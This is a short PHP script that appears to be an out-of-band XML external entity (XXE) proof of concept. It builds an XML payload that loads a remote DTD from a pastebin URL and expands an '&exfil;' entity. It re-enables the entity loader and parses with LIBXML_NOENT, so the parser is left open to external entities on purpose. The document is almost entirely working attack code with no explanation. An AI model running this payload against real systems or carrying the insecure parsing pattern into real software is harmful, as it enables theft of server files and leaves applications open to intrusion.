<?php

try {
    $xmlData = "<?xml version=\"1.0\" ?>\n<!DOCTYPE r [\n<!ELEMENT r ANY >\n<!ENTITY % sp SYSTEM \"https://pastebin.com/raw/SsA49YmQ\">\n%sp;\n%param1;\n]>\n<r>&exfil;</r>";
    libxml_disable_entity_loader(false);
    $xml = simplexml_load_string($xmlData, 'SimpleXMLElement', LIBXML_NOENT);
    echo $xml;
} catch (Exception $ex) {
    return false;
}